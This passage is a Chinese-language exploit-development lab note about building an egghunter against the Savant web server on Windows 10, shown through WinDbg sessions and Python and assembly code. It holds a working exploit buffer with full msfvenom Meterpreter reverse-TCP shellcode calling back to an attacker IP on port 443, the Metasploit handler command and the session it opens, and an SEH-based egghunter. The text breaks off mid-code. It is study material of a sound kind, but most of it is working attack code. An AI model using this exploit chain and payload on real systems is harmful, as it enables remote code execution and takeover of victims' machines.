     1 e Disable Clear  02f0eac3     0001 (0001)  0:**** 
```
Workflow:
```
Egghunter 找到 Egg
        |
        v
執行 JMP EDI
        |
        v
Breakpoint 被觸發
```
實際上 Breakpoint 沒有觸發、程式沒有 Crash\
問題不在 Egg 本身，因為已透過 WinDbg 確認第二段 Buffer 存在。\
下一步該檢查Egghunter 是否正確判斷每個 Memory Page 的可存取性？

### Identifying and Addressing the Egghunter Issue
System Call 是由 Windows Kernel 處理， Egghunter 不能自己控制全部，因此優先檢查 System call
- EAX 是否放入正確的 System Call Number
- EDX 是否指向正確的參數位置
- System Call 執行後 EAX 回傳什麼

在 INT 0x2E 設定 Breakpoint:
```dbg
0:003> ph
eax=02fffe70 ebx=014056d0 ecx=00000000 edx=77184550 esi=014056d0 edi=0041703c
eip=02ffea88 esp=02ffea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02ffea88 0f8411000000    je      02ffea9f                                [br=1]

0:003> u 02ffea9f L16
02ffea9f 90              nop
02ffeaa0 90              nop
02ffeaa1 90              nop
02ffeaa2 90              nop
02ffeaa3 90              nop
02ffeaa4 90              nop
02ffeaa5 6681caff0f      or      dx,0FFFh
02ffeaaa 42              inc     edx
02ffeaab 52              push    edx
02ffeaac 6a02            push    2
02ffeaae 58              pop     eax
02ffeaaf cd2e            int     2Eh
02ffeab1 3c05            cmp     al,5
02ffeab3 5a              pop     edx
02ffeab4 74ef            je      02ffeaa5
02ffeab6 b877303074      mov     eax,74303077h
02ffeabb 89d7            mov     edi,edx
02ffeabd af              scas    dword ptr es:[edi]
02ffeabe 75ea            jne     02ffeaaa
02ffeac0 af              scas    dword ptr es:[edi]
02ffeac1 75e7            jne     02ffeaaa
02ffeac3 ffe7            jmp     edi

0:003> bp 02ffeaaf 

0:003> bl
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674
     1 e Disable Clear  02ffeaaf     0001 (0001)  0:**** 
```
> - `02ffeaaf`: 在 INT 0x2E 設定 Breakpoint

WinDbg:
```dbg
0:003> g
Breakpoint 1 hit
eax=00000002 ebx=014056d0 ecx=00000000 edx=77185000 esi=014056d0 edi=0041703c
eip=02ffeaaf esp=02ffea30 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
02ffeaaf cd2e            int     2Eh

0:003> p
eax=c0000005 ebx=014056d0 ecx=00000000 edx=00000000 esi=014056d0 edi=0041703c
eip=02ffeab1 esp=02ffea30 ebp=41414141 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
02ffeab1 3c05            cmp     al,5

0:003> dc 77185000 
77185000  80a87074 568a0875 47178808 4e8d55eb  tp..u..V...G.U.N
77185010  144d3b0a 7d3b5577 333877f8 4e8b66c9  .;M.wU;}.w83.f.N
77185020  01568d08 8bf45589 9d0c23f1 7718472a  ..V..U...#..*G.w
77185030  eed3d987 def7d987 ff37748d 7208753b  .........t7.;u.r
77185040  03c1832a 3b39148d 1f770c55 758ba4f3  *.....9;U.w....u
77185050  4b10ebf4 0308558b 46e69d14 55897718  ...K.U.....F.w.U
77185060  83b3ebf8 afe909c6 b8fffffb c0000242  ............B...
77185070  c78b0ceb 8b08452b 0789187d 5e5fc033  ....+E..}...3._^
```
> `EAX = 0x02 EDX = 0x77185000` ，代表目前 Egghunter 使用 
System Call Number = 0x02
> - `p`: Step Over，讓 int 0x2e 執行完，再檢查結果\
> System Call 回傳 0xC0000005 (STATUS_ACCESS_VIOLATION)
> - `dc 77185000` : 代表 WinDbg 可以直接讀取這個地址的記憶體內容

Egghunter 使用 System Call 時，卻得到 STATUS_ACCESS_VIOLATION\
問題可能不是這個記憶體地址本身，而是 System Call Number 不正確
- dc：WinDbg 直接檢視目標 Process 的記憶體。
- Egghunter：透過指定的 System Call Number 進入 Kernel

>[!Important]
>舊版 Windows 中 `NtAccessCheckAndAuditAlarm = 0x02`\
>但 Windows 8 之後，System Call Number 不再固定。尤其 Windows 10，可能隨著不同 Update 改變\
>👉🏻 原本寫死 push 0x02 的 Egghunter，在 Windows 10 上就可能呼叫到錯誤的 System Call

使用 WinDbg 查詢正確 System Call Number
```dbg
0:001> u ntdll!NtAccessCheckAndAuditAlarm
ntdll!NtAccessCheckAndAuditAlarm:
76f20ec0 b8c6010000      mov     eax,1C6h
76f20ec5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (76f20ecd)
76f20eca c22c00          ret     2Ch
76f20ecd 8bd4            mov     edx,esp
76f20ecf 0f34            sysenter
76f20ed1 c3              ret
...
```
> - `mov eax, 1C6h`: 代表目前這台 Windows 的NtAccessCheckAndAuditAlarm System Call Number = 0x1C6

poc 需改成 EAX = 0x1C6，🥚 存在 Null Bytes

使用 [NEG](https://c9x.me/x86/html/file_module_x86_id_216.html) assembly instruction 避免 Null Bytes
```asm
0:001> ? 0x00 - 0x1C6
Evaluate expression: -454 = fffffe3a

0:001> ? 0x00 - 0xfffffe3a
Evaluate expression: -4294966842 = ffffffff`000001c6
```
> 0 - 0x1C6 = -0x1C6 (32-bit Two's Complement) 0xFFFFFE3A\
> (neg eax) 0 - 0xFFFFFE3A = 0x000001C6\
> 能取得正確的 System Call Number

更新 PoC
```asm
push edx

mov eax, 0xfffffe3a
neg eax

int 0x2e
```
取得 Egghunter Opcode
```
┌──(chw💲CHW)-[~]
└─$ python3 original_egghunter_win10.py
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x68\xc6\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7")
```

Updated egghunter code
```asm
...
"	loop_check:				 "
		# Save the edx register which holds our memory 
		# address on the stack
"		push edx			;"
		# Push the negative value of the system 
		# call number
"		mov eax, 0xfffffe3a	;" 
		# Initialize the call to NtAccessCheckAndAuditAlarm
"		neg eax				;" 
		# Perform the system call
"		int 0x2e			;" 
		# Check for access violation, 0xc0000005 
		# (ACCESS_VIOLATION)
"		cmp al,05			;" 
		# Restore the edx register to check 
		# later for our egg
"		pop edx				;" 
...

```

Windbg:
```dbg
0:003> ph
eax=02fdfe70 ebx=017356d0 ecx=00000000 edx=77184550 esi=017356d0 edi=0041703c
eip=02fdea88 esp=02fdea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02fdea88 0f8411000000    je      02fdea9f                                [br=1]

0:003> u 02fdea9f L16
02fdea9f 90              nop
02fdeaa0 90              nop
02fdeaa1 90              nop
02fdeaa2 90              nop
02fdeaa3 90              nop
02fdeaa4 90              nop
02fdeaa5 6681caff0f      or      dx,0FFFh
02fdeaaa 42              inc     edx
02fdeaab 52              push    edx
02fdeaac b83afeffff      mov     eax,0FFFFFE3Ah
02fdeab1 f7d8            neg     eax
02fdeab3 cd2e            int     2Eh
02fdeab5 3c05            cmp     al,5
02fdeab7 5a              pop     edx
02fdeab8 74eb            je      02fdeaa5
02fdeaba b877303074      mov     eax,74303077h
02fdeabf 89d7            mov     edi,edx
02fdeac1 af              scas    dword ptr es:[edi]
02fdeac2 75e6            jne     02fdeaaa
02fdeac4 af              scas    dword ptr es:[edi]
02fdeac5 75e3            jne     02fdeaaa
02fdeac7 ffe7            jmp     edi

0:003> bp 02fdeac7 

0:003> bl
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674
     1 e Disable Clear  02fdeac7     0001 (0001)  0:**** 
     
0:003> g
Breakpoint 1 hit
eax=74303077 ebx=017356d0 ecx=02fdea30 edx=01735a86 esi=017356d0 edi=01735a8e
eip=02fdeac7 esp=02fdea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02fdeac7 ffe7            jmp     edi {01735a8e}

0:003> dc @edi - 0x08
01735a86  74303077 74303077 44444444 44444444  w00tw00tDDDDDDDD
01735a96  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
01735aa6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
01735ab6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
01735ac6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
01735ad6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
01735ae6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
01735af6  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
```
> ![image](https://hackmd.io/_uploads/BJ9Rz8y0fg.png)
> - `dc @edi - 0x08`: w00tw00t\
> EDI = 0x01735a8e 正好指向 Egg 後面的第一個 Byte 且 `jmp edi` 會把執行流程導向這個地址

已經解決：
- Heap Buffer 地址不固定的問題
- Egghunter 無法判斷記憶體的問題
- Windows 10 System Call Number 改變的問題
- 新 System Call Number 帶來的 Null Byte 問題

### Obtaining a Shell
Egghunter 已找到第二段 Buffer，下一步就是把原本的
```python
shellcode = b"w00tw00t" + b"\x44" * 400
```
換成真正的 Payload

先重新測試 Bad Characters\
(第一段 Buffer 屬於 HTTP Method ; 第二段 Buffer 存放真正 Shellcode，在 HTTP Request 結束後的資料，Bad Characters 不一定適用)
```python
...
  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  badchars = (
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    b"\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19"
    b"\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    b"\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33"
    b"\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
    b"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
    b"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67"
    b"\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74"
    b"\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
    b"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
    b"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b"
    b"\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    b"\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5"
    b"\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
    b"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
    b"\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9"
    b"\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6"
    b"\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  shellcode = b"w00tw00t" + badchars + b"\x44" * (400-len(badchars))

  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
...
```

在 POP EAX; RET (`0x00418674`) instruction sequence 設定一個斷點 ，接著搜尋 Egg `s -a 0x0 L?80000000 w00tw00t`
```dbg
Breakpoint 0 hit
eax=00000000 ebx=002556d0 ecx=0000000e edx=77184550 esi=002556d0 edi=0041703c
eip=00418674 esp=02f9ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax

0:003> s -a 0x0 L?80000000 w00tw00t
00255a86  77 30 30 74 77 30 30 74-00 01 02 03 04 05 06 07  w00tw00t........

0:003> db 00255a86 L110
00255a86  77 30 30 74 77 30 30 74-00 01 02 03 04 05 06 07  w00tw00t........
00255a96  08 09 0a 0b 0c 0d 0e 0f-10 11 12 13 14 15 16 17  ................
00255aa6  18 19 1a 1b 1c 1d 1e 1f-20 21 22 23 24 25 26 27  ........ !"#$%&'
00255ab6  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567
00255ac6  38 39 3a 3b 3c 3d 3e 3f-40 41 42 43 44 45 46 47  89:;<=>?@ABCDEFG
00255ad6  48 49 4a 4b 4c 4d 4e 4f-50 51 52 53 54 55 56 57  HIJKLMNOPQRSTUVW
00255ae6  58 59 5a 5b 5c 5d 5e 5f-60 61 62 63 64 65 66 67  XYZ[\]^_`abcdefg
00255af6  68 69 6a 6b 6c 6d 6e 6f-70 71 72 73 74 75 76 77  hijklmnopqrstuvw
00255b06  78 79 7a 7b 7c 7d 7e 7f-80 81 82 83 84 85 86 87  xyz{|}~.........
00255b16  88 89 8a 8b 8c 8d 8e 8f-90 91 92 93 94 95 96 97  ................
00255b26  98 99 9a 9b 9c 9d 9e 9f-a0 a1 a2 a3 a4 a5 a6 a7  ................
00255b36  a8 a9 aa ab ac ad ae af-b0 b1 b2 b3 b4 b5 b6 b7  ................
00255b46  b8 b9 ba bb bc bd be bf-c0 c1 c2 c3 c4 c5 c6 c7  ................
00255b56  c8 c9 ca cb cc cd ce cf-d0 d1 d2 d3 d4 d5 d6 d7  ................
00255b66  d8 d9 da db dc dd de df-e0 e1 e2 e3 e4 e5 e6 e7  ................
00255b76  e8 e9 ea eb ec ed ee ef-f0 f1 f2 f3 f4 f5 f6 f7  ................
00255b86  f8 f9 fa fb fc fd fe ff-44 44 44 44 44 44 44 44  ........DDDDDDDD
```
> - `db 00255a86 L110`: L110 表示顯示 0x110 個 Bytes\
> 00～FF 都完整存在於記憶體中。第二段 Buffer 的這組測試資料沒有被破壞

建構 Payload
```
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=<KALI_IP> \
LPORT=443 \
-f python \
-v payload
```

將 Meterpreter Payload 放入第二段 Buffer
```python
...
  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload
  payload  = b""
  payload += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
  payload += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
  payload += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
  payload += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
  payload += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
  payload += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
  payload += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
  payload += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
  payload += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
  payload += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
  payload += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
  payload += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
  payload += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
  payload += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29"
  payload += b"\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x76\x03"
  payload += b"\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50\x40"
  payload += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
  payload += b"\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0"
  payload += b"\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00"
  payload += b"\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
  payload += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00"
  payload += b"\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff"
  payload += b"\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8"
  payload += b"\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00\x40"
  payload += b"\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
  payload += b"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
  payload += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff"
  payload += b"\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56"
  payload += b"\x6a\x00\x53\xff\xd5"

  shellcode = b"w00tw00t" + payload + b"\x44" * (400-len(payload))

  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
...
```

Set up Metasploit handler
```
┌──(chw💲CHW)-[~]
└─$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"
...
[*] Started reverse TCP handler on 192.168.119.120:443 
[*] Sending stage (180291 bytes) to 192.168.120.10
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.10:49676)

meterpreter > shell
Process 3088 created.
Channel 1 created.
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Savant> ipconfig
ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.120.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.120.254
```
```
HTTP Request
    |
    v
覆寫 EIP
    |
    v
POP EAX; RET
    |
    v
跳到第一段 Buffer
    |
    v
Egghunter 開始掃描記憶體
    |
    v
找到 w00tw00t
    |
    v
確認第二個 w00t
    |
    v
JMP EDI
    |
    v
執行 Meterpreter Payload
    |
    v
Reverse TCP Connection
    |
    v
取得 Meterpreter Session
```
## Improving the Egghunter Portability Using SEH
上述的 Egghunter 依賴 Windows System Call Number，因此在不同 Windows 版本上可能無法正常運作\
改用 SEH（Structured Exception Handling），讓 Egghunter 自行處理存取無效記憶體時產生的 Access Violation，不依賴特定的 Windows System Call

egghunter_seh_original.py of the SEH egghunter
```Python
from keystone import *

CODE = (
"	start: 									 "
		# jump to a negative call to dynamically 
		# obtain egghunter position
"		jmp get_seh_address 				;" 
"	build_exception_record: 				 "
		# pop the address of the exception_handler 
		# into ecx
"		pop ecx 							;" 
		# mov signature into eax
"		mov eax, 0x74303077 				;" 
		# push Handler of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;" 
		# push Next of the 
		# _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;" 
		# null out ebx
"		xor ebx, ebx 						;" 
		# overwrite ExceptionList in the TEB with a pointer
		# to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;" 
"	is_egg: 								 "
		# push 0x02
"		push 0x02 							;" 
		# pop the value into ecx which will act 
		# as a counter
"		pop ecx 							;" 
		# mov memory address into edi
"		mov edi, ebx 						;" 
		# check for our signature, if the page is invalid we 
		# trigger an exception and jump to our exception_handler function
"		repe scasd 							;" 
		# if we didn't find signature, increase ebx 
		# and repeat
"		jnz loop_inc_one 					;"  
		# we found our signature and will jump to it
"		jmp edi 							;" 
"	loop_inc_page: 							 " 
		# if page is invalid the exception_handler will 
		# update eip to point here and we move to next page
"		or bx, 0xfff 						;" 
"	loop_inc_one: 							 "
		# increase ebx by one byte
"		inc ebx 							;" 
		# check for signature again
"		jmp is_egg 							;" 
"	get_seh_address: 						 "
		# call to a higher address to avoid null bytes & push 
		# return to obtain egghunter position
"		call build_exception_record 		;" 
		# push 0x0c onto the stack
"		push 0x0c 							;" 
		# pop the value into ecx
"		pop ecx 							;" 
		# mov into eax the pointer to the CONTEXT 
		# structure for our exception
"		mov eax, [esp+ecx] 					;" 
		# mov 0xb8 into ecx which will act as an 
		# offset to the eip
"		mov cl, 0xb8						;" 
		# increase the value of eip by 0x06 in our CONTEXT 
		# so it points to the "or bx, 0xfff" instruction 
		# to increase the memory page
"		add dword ptr ds:[eax+ecx], 0x06	;" 
		# save return value into eax
"		pop eax 							;" 
		# increase esp to clean the stack for our call
"		add esp, 0x10 						;" 
		# push return value back into the stack
"		push eax 							;" 
		# null out eax to simulate 
		# ExceptionContinueExecution return
"		xor eax, eax 						;" 
		# return
"		ret 								;" 
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
print("egghunter = (\"" + egghunter + "\")")
```
- JMP 到 get_seh_address
執行 [JMP](https://c9x.me/x86/html/file_module_x86_id_147.html) 指令跳到 get_seh_address 函數
- 執行向後的 CALL
在`get_seh_address` 函數中，第一條指令是對 `build_exception_record` 函數 relative [CALL](https://c9x.me/x86/html/file_module_x86_id_26.html)。執行relative CALL 時，opcodes 會與 EIP 目前值的 offset 一樣\
此情況除非使用負偏移量 backward call，否則會產生 null bytes。\
根據 x86 calling convention 執行 CALL 時會將回傳值壓入 stack。這讓我們能夠動態地獲取 egghunter 在記憶體中的位置\
![image](https://hackmd.io/_uploads/SyVkzvJAGg.png)


Egghunter 開始執行 build_exception_record function 中的指令 。第一條指令是 POP 將先前 CALL 函數呼叫壓入堆疊中的返回值儲存到 ECX register。之後 egg 會被移入 EAX register
```asm
...
"	build_exception_record: 				     "
		# pop the address of the exception_handler into ecx
"		pop ecx 							            ;" 
		# mov signature into eax
"		mov eax, 0x74303077 				      ;" 
...
```
- POP ECX
下一步建立 `_EXCEPTION_REGISTRATION_RECORD` structure\
利用儲存在 ECX 中的值壓入該 structure 來完成。
- 建立 _EXCEPTION_REGISTRATION_RECORD
ECX 儲存著指向呼叫 `build_exception_record` 後下一個的 return address\
👉🏻 `_EXCEPTION_REGISTRATION_RECORD` structure 的 Handler member。然後將 "-1"（0xffffffff）壓入該結構作為 Next member。這標誌著儲存異常記錄的單鍊錶的結束
```asm
...
		# push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							            ;" 
		# push Next of the _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					        ;" 
...
```
- 將自訂 Exception Handler 安裝到 TEB
最後 shellcode 安裝自訂 exception handler.。透過將 TEB structure 中的 ExceptionList member 替換為我們自訂的 stack pointer 
```asm
...
		# null out ebx
"		xor ebx, ebx 						          ;" 
		# overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		  ;" 
...
```
> 因為 EBX 是 0，所以等同 `mov dword ptr fs:[0], esp`\
> 把剛剛建立的 Exception Registration Record 位址，寫入目前 Thread 的 ExceptionList

核心概念:
- FS:[0]：目前 Thread 的 ExceptionList
- ESP：建立的 Registration Record 位址
- Handler：我們透過 CALL / POP 動態取得的程式碼位置

完整程式碼架構：
```asm
start:
    jmp get_seh_address

build_exception_record:
    pop ecx
    mov eax, 0x74303077

    push ecx
    push 0xffffffff

    xor ebx, ebx
    mov dword ptr fs:[ebx], esp

is_egg:
    push 0x02
    pop ecx
    mov edi, ebx
    repe scasd
    jnz loop_inc_one
    jmp edi

loop_inc_page:
    or bx, 0xfff

loop_inc_one:
    inc ebx
    jmp is_egg

get_seh_address:
    call build_exception_record

    push 0x0c
    pop ecx
    mov eax, [esp+ecx]
    mov cl, 0xb8
    add dword ptr ds:[eax+ecx], 0x06

    pop eax
    add esp, 0x10
    push eax
    xor eax, eax
    ret
```
![image](https://hackmd.io/_uploads/B1k6i-xRfl.png)

>[!Note]
>找到友善的 Blog:\
>[Windows User Mode Exploit Development: Structured Exception Handler (SEH) Part 2](https://memn0ps.github.io/windows-user-mode-exploit-development-seh-part-2/)\
>![image](https://hackmd.io/_uploads/ryuMNGe0Me.png)

使用 [REPE](https://c9x.me/x86/html/file_module_x86_id_279.html) SCASD 搜尋 Egg\
開始真正搜尋記憶體:
```asm
is_egg:
    push 0x02
    pop ecx
    mov edi, ebx
    repe scasd
    jnz loop_inc_one
    jmp edi
```
> 1. 設定 ECX = 2 接著 mov edi, ebx: 讓 EDI 指向目前正在搜尋的記憶體位址
> 2. SCASD 是 x86 字串指令，用來比較 EAX 與 ES:[EDI]\
> 比較完成後 EDI 會自動增加 4（前提是 Direction Flag = 0）
> 3. `repe scasd` 只要比較結果相等，而且 ECX 尚未歸零，就繼續比較\
> ECX = 2 所以最多比較兩次 DWORD (兩個 w00t)
> 4. 若兩次都相等 `jnz loop_inc_one` 不會跳轉，接著 jmp edi 直接跳到 EDI 指向的位置

遇到無效記憶體時跳過 Page
```asm
loop_inc_page:
    or bx, 0xfff

loop_inc_one:
    inc ebx
    jmp is_egg
```
發生 Access Violation 的情況，若目前 EBX 指向無法存取的記憶體 `repe scasd` 就會觸發 Access Violation

Windows 會進入 SEH 處理流程，希望 Handler 修改 EIP，讓它跳到 `loop_inc_page` `or bx, 0xfff`，把 EBX 推進目前 4KB Page 的最後位置

So...：
- 沒有找到 Egg：增加 1 Byte
- 遇到無效 Page：跳到下一個 Page

自訂的 Exception Handler 修改 EIP
```cpp
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,  
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 
```
> - `ExceptionRecord`: 例外相關資訊
> - `EstablisherFrame`: 目前 Exception Frame
> - `ContextRecord`: 例外發生時的 CPU 暫存器狀態
> - `DispatcherContext`: 例外分派相關資訊
>
> 值得注意 `PCONTEXT ContextRecord` 它指向 CONTEXT 結構


CONTEXT 結構利用 windbg 查看：
```dbg
0:006> dt ntdll!_CONTEXT
   +0x000 ContextFlags     : Uint4B
   +0x004 Dr0              : Uint4B
   +0x008 Dr1              : Uint4B
   +0x00c Dr2              : Uint4B
   +0x010 Dr3              : Uint4B
   +0x014 Dr6              : Uint4B
   +0x018 Dr7              : Uint4B
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : Uint4B
   +0x090 SegFs            : Uint4B
   +0x094 SegEs            : Uint4B
   +0x098 SegDs            : Uint4B
   +0x09c Edi              : Uint4B
   +0x0a0 Esi              : Uint4B
   +0x0a4 Ebx              : Uint4B
   +0x0a8 Edx              : Uint4B
   +0x0ac Ecx              : Uint4B
   +0x0b0 Eax              : Uint4B
   +0x0b4 Ebp              : Uint4B
   +0x0b8 Eip              : Uint4B
   +0x0bc SegCs            : Uint4B
   +0x0c0 EFlags           : Uint4B
   +0x0c4 Esp              : Uint4B
   +0x0c8 SegSs            : Uint4B
   +0x0cc ExtendedRegisters : [512] UChar
```
> `Eip offset = 0xB8`: ContextRecord + 0xB8 存放例外發生時的 EIP\
> 👉🏻 可以修改它，讓 CPU 從指定位置繼續執行

>[!Tip]
> 假設發生例外時，EIP 指向 `repe scasd`\
> 這條指令因為存取無效記憶體而觸發 Access Violation\
> 不讓 Windows 讓它重新執行同一條指令，否則會再次發生相同錯誤\
> 🎯 把 EIP 改成 `loop_inc_page`\
> 這樣 Handler 結束後，程式就能跳過目前無效的 Page


逐行解釋 Exception Handler 的 Assembly
```asm
push 0x0c
pop ecx
mov eax, [esp+ecx]
mov cl, 0xb8
add dword ptr ds:[eax+ecx], 0x06
pop eax
add esp, 0x10
push eax
xor eax, eax
ret
```
① 取得 ContextRecord 參數: `push 0x0c  pop ecx`\
讓 ECX = 0x0C，在 x86 呼叫慣例中，函式參數放在 Stack 上，每個參數佔 4 bytes：
```asm
[ESP+0x00]  Return Address
[ESP+0x04]  ExceptionRecord
[ESP+0x08]  EstablisherFrame
[ESP+0x0C]  ContextRecord
[ESP+0x10]  DispatcherContext
```
所以 `mov eax, [esp+ecx]` 等同 `mov eax, [esp+0x0c]`，EAX = ContextRecord 位址

② 找到 CONTEXT 中的 EIP: `mov cl, 0xb8`\
讓 CL = 0xB8，因為 EAX 已經是 ContextRecord 位址，所以 `add dword ptr ds:[eax+ecx], 0x06` 等同於 `ContextRecord->Eip += 6;`  (從原本發生 Access Violation 的 repe scasd 指令位置開始，增加 6 bytes，就會跳到：`or bx, 0xfff`)

③ 處理返回位址與 Stack: `pop eax`\
取出原本 Stack 上保存的返回位址。接著 `add esp, 0x10` 調整 ESP，跳過四個 DWORD 的函式參數\
`xor eax,eax` 讓 EAX = 0 ，這個值用來表示 `ExceptionContinueExecution = 0`

產生 Egghunter Opcode
```python
from keystone import *

